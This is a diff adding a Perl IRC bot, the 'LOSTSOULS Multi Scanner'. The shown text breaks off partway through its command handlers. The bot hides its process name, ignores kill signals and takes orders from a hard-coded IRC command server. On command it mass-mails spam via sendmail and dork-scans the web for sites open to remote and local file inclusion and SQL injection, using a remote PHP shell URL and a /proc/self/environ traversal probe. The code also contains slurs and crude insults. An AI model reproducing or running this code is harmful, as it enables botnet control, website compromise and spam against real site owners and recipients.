@@ -1,0 +1,2086 @@
+#!/usr/bin/perl
+
+use HTTP::Request;
+use LWP::UserAgent;
+use IO::Socket;
+use IO::Select;
+use Socket;
+
+my $procfake  = "/bin/sh/root";
+my $privserver    = 'irc.byroe.org';
+my $privport   = "6667";
+my $nickname  = "sql".int(rand(1000));
+my $ident     = "sql".int(rand(1000));
+my $channel   = '#bop';
+my $result_channel_cmd = '#NovaEraa';
+my $result_channel = '#NovaEraa';
+my $runner    = "Mnp_Bopob";
+my $fullname  = 'Mnp_Bopob';
+my $loger = "*";
+
+my $injector  ='http://binaric.com/img.php.jpg';
+my $phpshell  = 'http://binaric.com/img.php.jpg';
+my $rficmd    = 'isouhsouihsui';
+my $lficmd    = 'lfi';
+my $sqlcmd = 'sql';
+my $mysqlcmd  = '!mysql';
+my $mssqlcmd  = '!mssql';
+my $alicmd    = '!log';
+
+my $memail = 'Mnp_Bopob';
+
+
+my $lficmdsite = 'http://binaric.com/img.php.jpg';
+my $lficmdname = 'img.php';
+my $lficmdresult = 'irc.shadow-network.net - #infects';
+
+my $thauzinho = 0;
+
+
+$rfi_result   = "h4uguen";
+$lfi_test     = "../../../../../../../../../../../../../../../../proc/self/environ%00";
+$lfi_test     = "../../../../../../../../../../../../../../../../proc/self/environ";
+$lfi_output   = "DOCUMENT_ROOT";
+$sql_test     = "'";
+$mysql_output = ("Query failed|Query Error|right syntax to use near");
+$mssql_output = ("SQL Server error|Incorrect syntax near|syntax error converting|unclosed quotation");
+
+my $success   = "\n [+] LOSTSOULS Multi Scanner\n [-] Loading Successfully ...\n [-] Process/PID : $procfake - $$\n";
+my $failed    = "\n [-] perl $0 <host> <port> <nick> <ident> <chan> <admin> <fakeproc> <response> <phpshell>\n\n";
+
+print $success;
+
+$SIG{'INT'}   = 'IGNORE';
+$SIG{'HUP'}   = 'IGNORE';
+$SIG{'TERM'}  = 'IGNORE';
+$SIG{'CHLD'}  = 'IGNORE';
+$SIG{'PS'}    = 'IGNORE';
+
+chdir("/");
+$privserver="$ARGV[0]" if $ARGV[0];
+$0 = "$procfake"."\0"x16;;
+my $pid = fork;
+exit if $pid;
+die "\n [!] Something Wrong !!!: $!" unless defined($pid);
+
+our %irc_servers;
+our %DCC;
+my $dcc_sel = new IO::Select->new();
+$sel_client = IO::Select->new();
+
+sub sendraw {
+	if ($#_ == '1') {
+	my $socket = $_[0];
+	print $socket "$_[1]\n";
+	} else {
+		print $IRC_cur_socket "$_[0]\n";
+	}
+}
+
+sub connector {
+	my $mynick = $_[0];
+	my $privserver_con = $_[1];
+	my $privport_con = $_[2];
+	my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$privserver_con", PeerPort=>$privport_con) or return(1);
+	if (defined($IRC_socket)) {
+		$IRC_cur_socket = $IRC_socket;
+		$IRC_socket->autoflush(1);
+		$sel_client->add($IRC_socket);
+		$irc_servers{$IRC_cur_socket}{'host'} = "$privserver_con";
+		$irc_servers{$IRC_cur_socket}{'port'} = "$privport_con";
+		$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+		$irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
+		nick("$mynick");
+		sendraw("USER $ident ".$IRC_socket->sockhost." $privserver_con :$fullname");
+		sleep 1;
+	}
+}
+
+sub parse {
+	my $servarg = shift;
+	if ($servarg =~ /^PING \:(.*)/) {
+		sendraw("PONG :$1");
+	} elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
+		my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
+		if ($args =~ /^\001VERSION\001$/) {
+			notice("$pn", "\001VERSION mIRC v6.17 Khaled Mardam-Bey\001");
+		}
+		if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/ ) {
+			my $natrix = $1;
+			my $arg = $2;
+		}
+	}
+	elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
+		if (lc($1) eq lc($mynick)) {
+			$mynick=$4;
+			$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+		}
+	} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
+		nick("$mynick|".int rand(999));
+	} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
+		$mynick = $2;
+		$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+		$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
+		sendraw("MODE $nickname +Bx");
+		sendraw("JOIN $channel");
+		sendraw("JOIN $result_channel");
+		sendraw("JOIN $result_channel_cmd");
+		sendraw("OPER buceta gostosa");
+		sendraw("PRIVMSG $channel :sup niggaz! ;*");
+	}
+}
+
+my $line_temp;
+while( $thauzinho != 1 ) {
+	while (!(keys(%irc_servers)) && ($thauzinho != 1)) { connector("$nickname", "$privserver", "$privport"); }
+	delete($irc_servers{''}) if (defined($irc_servers{''}));
+	my @ready = $sel_client->can_read(0);
+	next unless(@ready);
+	foreach $fh (@ready) {
+		$IRC_cur_socket = $fh;
+		$mynick = $irc_servers{$IRC_cur_socket}{'nick'};
+		$nread = sysread($fh, $msg, 4096);
+		if ($nread == 0) {
+			$sel_client->remove($fh);
+			$fh->close;
+			delete($irc_servers{$fh});
+		}
+		@lines = split (/\n/, $msg);
+		$msg =~ s/\r\n$//;
+
+		#####################################################################
+		############################[ CMD LIST ]#############################
+		#####################################################################
+
+		if ($msg=~ /PRIVMSG $channel :!help/){
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2Help15) 6 $rficmd <bug> <dork> | $lficmd <bug> <dork> ");
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2Help15) 6 $mysqlcmd / $mssqlcmd <bug> <dork> ");
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2Help15) 6 Apache Log Injection : $alicmd <host> <port> ");
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2Help15) 6 !id | !engine | !pid | !version | !about ");
+		}
+
+		if ($msg=~ /PRIVMSG $channel :!siouhsuios/){
+			&response();
+		}
+
+		if ($msg=~ /PRIVMSG $channel :!siohusiouhsouis/){
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2Version15)12 EAE CAMBADA DE FILHO DA PUTA! ");
+		}
+
+		if ($msg=~ /PRIVMSG $channel :!suiohsouihsoius/){
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2Engine15)12 Google, Bing, ASK, UOL, LyCos, Yahoo, Biglobe, Seznam.");
+		}
+
+		if ($msg=~ /PRIVMSG $channel :!pid/){
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2PID15)12 Process/ID : 12 $procfake - $$");
+		}
+
+		if ($msg=~ /PRIVMSG $channel :!thauzinho/){
+			$thauzinho = 1;
+		}
+
+		if ($msg=~ /PRIVMSG $channel :$nickname:thauzinho/){
+			$thauzinho = 1;
+		}
+
+		if ($msg=~ /PRIVMSG $channel :!about/){
+			#sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2About15)3 LOSTSOULS Multi Scanner v5.1");
+			#sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2About15)3 Coded by Vrs-hCk - MainHack BrotherHood ");
+			#sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2About15)3 Copyleft © 2009 LOSTSOULS UnderGrounD");
+		}
+
+		#####################################################################
+		###############################[ RFI ]###############################
+		#####################################################################
+
+		##################################################################### Spammer
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+(.*?)\s+(.*?)\s+(.*?)\s+(.*)\s+-nome\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my ($list,$eng,$from,$assunto, $nome) = ($1,$2,$3,$4,$5);
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :12+1SPAM by SendMail Iniciado!!!");
+
+					my $scr = getcontent($list);
+					if ($scr !~ m/.*\@.*\..*/) {
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :12+1Lista Mail Ruim!!!");
+					exit(0);
+					}
+					my @list = split(/\n/, $scr);
+					$assunto =~ s/\n//g;
+	    
+					my $i = 0;
+					my $mailtype = "content-type: text/html";
+					my $sendmail = '/usr/sbin/sendmail';
+					my $total = scalar(@list);
+					my $eeng = getcontent($eng);
+					foreach my $email (@list) {
+					$i++;
+					open (SENDMAIL, "| $sendmail -t");
+					print SENDMAIL "$mailtype\n";
+					print SENDMAIL "Subject: $assunto\n";
+					print SENDMAIL "From: $nome <$from>\n";
+					print SENDMAIL "To: $email\n\n";
+					print SENDMAIL "$eeng\n\n";
+					close (SENDMAIL);
+					if (($i % 1000 == 0)||($i == $total)) {
+					my $eeng = getcontent($eng);
+			    
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :1Spam by SendMail:14 Enviados: $i de $total");
+			    
+		    }
+		}
+	    
+	    
+            sendraw($IRC_cur_socket, "PRIVMSG $channel :12+1Status - Spam by SendMail finalizado");
+            			
+
+			    my $assunto = "Teste de Inboxes";
+			    my $from = "Xscholler\@Homossexual.co";
+			    my $eeng = "Oi gatinho, eu sou o $nickname , estou toda inboxizinha. . .";
+			    my $mailtype = "content-type: text/html";
+			    my $sendmail = '/usr/sbin/sendmail';
+			    open (SENDMAIL, "| $sendmail -t");
+			    print SENDMAIL "$mailtype\n";
+			    print SENDMAIL "Subject: $assunto\n";
+			    print SENDMAIL "From: $nome <$from>\n";
+			    print SENDMAIL "To: $memail\n\n";
+			    print SENDMAIL "$eeng\n\n";
+			    close (SENDMAIL);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Google Engine
+		if ($msg=~ /PRIVMSG $channel :!test\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my ($email) = ($1);
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :12+1Teste do SendMail Iniciado!!!");
+
+					if ($email !~ m/.*\@.*\..*/) {
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :12+1Digite um email, idiota!!!");
+					exit(0);
+					}
+					$memail = $email;
+	    
+	    
+					my $assunto = "Teste de Inboxes";
+					my $from = "Xscholler\@Homossexual.co";
+					my $eeng = "Oi gatinho, eu sou o $nickname , estou toda inboxizinha. . .";
+					my $mailtype = "content-type: text/html";
+					my $sendmail = '/usr/sbin/sendmail';
+					open (SENDMAIL, "| $sendmail -t");
+					print SENDMAIL "$mailtype\n";
+					print SENDMAIL "Subject: $assunto\n";
+					print SENDMAIL "From: $from\n";
+					print SENDMAIL "To: $email\n\n";
+					print SENDMAIL "$eeng\n\n";
+					close (SENDMAIL);
+		
+	    
+	    
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :12+1Status - Spam ASP by SendMail finalizado 12-");
+            
+				}
+				exit;
+			}
+		}
+
+
+		##################################################################### Google Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$rficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "GooGLe";
+					my $bugx = $1;
+					my $d0rk = $2;
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2RFI15)(3@2LOSTSOULS15)12 Dork :12 $d0rk");
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2RFI15)(3@2LOSTSOULS15)12 File :12 $bugx");
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2RFI15)(3@2LOSTSOULS15)3 Search Engine Loading ...");
+					&rfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### AllTheWeb Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$rficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "AllTheWeb";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&rfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Bing Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$rficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Bing";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&rfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Altavista Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$rficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "ALtaViSTa";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&rfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### ASK Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$rficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "AsK";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&rfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### UoL Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$rficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "UoL";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&rfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### LyCos Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$rficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "LyCos";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&rfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Yahoo Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$rficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "YahOo";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&rfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		#####################################################################
+		###############################[ LFI ]###############################
+		#####################################################################
+
+		##################################################################### Google Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$lficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "GooGLe";
+					my $bugx = $1;
+					my $d0rk = $2;
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2LFI15)(3@2LOSTSOULS15)12 Dork :12 $d0rk");
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2LFI15)(3@2LOSTSOULS15)12 File :12 $bugx");
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2LFI15)(3@2LOSTSOULS15)3 Search Engine Loading ...");
+					&lfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### AllTheWeb Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$lficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "AllTheWeb";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&lfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Bing Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$lficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Bing";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&lfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Altavista Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$lficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "ALtaViSTa";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&lfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### ASK Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$lficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "AsK";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&lfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### UoL Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$lficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "UoL";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&lfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### LyCos Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$lficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "LyCos";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&lfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Yahoo Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$lficmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "YahOo";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&lfiscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+		
+		
+
+		#####################################################################
+		##########################[ Blind SQL and Normal ]#############################
+		#####################################################################
+
+		##################################################################### Google Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "GooGLe";
+					my $d0rk = $1;
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2LOSTSOULS15)12 Dork :12 $d0rk");
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2LOSTSOULS15)3 Search Engine Loading ...");
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### AllTheWeb Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "AllTheWeb";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Bing Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Bing";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Altavista Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "ALtaViSTa";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### ASK Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "AsK";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### UoL Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "UoL";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### LyCos Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "LyCos";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Yahoo Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "YahOo";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Biglobe Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Biglobe";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Seznam Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Seznam";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Sapo Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Sapo";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Hotbot Engine
+		if ($msg=~ /PRIVMSG $channel :$nickname\s+$sqlcmd\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Hotbot";
+					my $d0rk = $1;
+					&sqlscan($engx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+
+		#####################################################################
+		##############################[ MySQL ]##############################
+		#####################################################################
+
+		##################################################################### Google Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "GooGLe";
+					my $bugx = $1;
+					my $d0rk = $2;
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2LOSTSOULS15)12 Dork :12 $d0rk");
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2LOSTSOULS15)12 File :12 $bugx");
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2LOSTSOULS15)3 Search Engine Loading ...");
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### AllTheWeb Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "AllTheWeb";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Bing Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Bing";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Altavista Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "ALtaViSTa";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### ASK Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "AsK";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### UoL Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "UoL";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Lycos Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "LyCos";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Yahoo Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "YahOo";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Biglobe Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Biglobe";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Seznam Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Seznam";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Sapo Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Sapo";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Hotbot Engine
+		if ($msg=~ /PRIVMSG $channel :$mysqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Hotbot";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mysqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		#####################################################################
+		##############################[ MSSQL ]##############################
+		#####################################################################
+
+		##################################################################### Google Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "GooGLe";
+					my $bugx = $1;
+					my $d0rk = $2;
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2LOSTSOULS15)12 Dork :12 $d0rk");
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2LOSTSOULS15)12 File :12 $bugx");
+					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2LOSTSOULS15)3 Search Engine Loading ...");
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### AllTheWeb Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "AllTheWeb";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
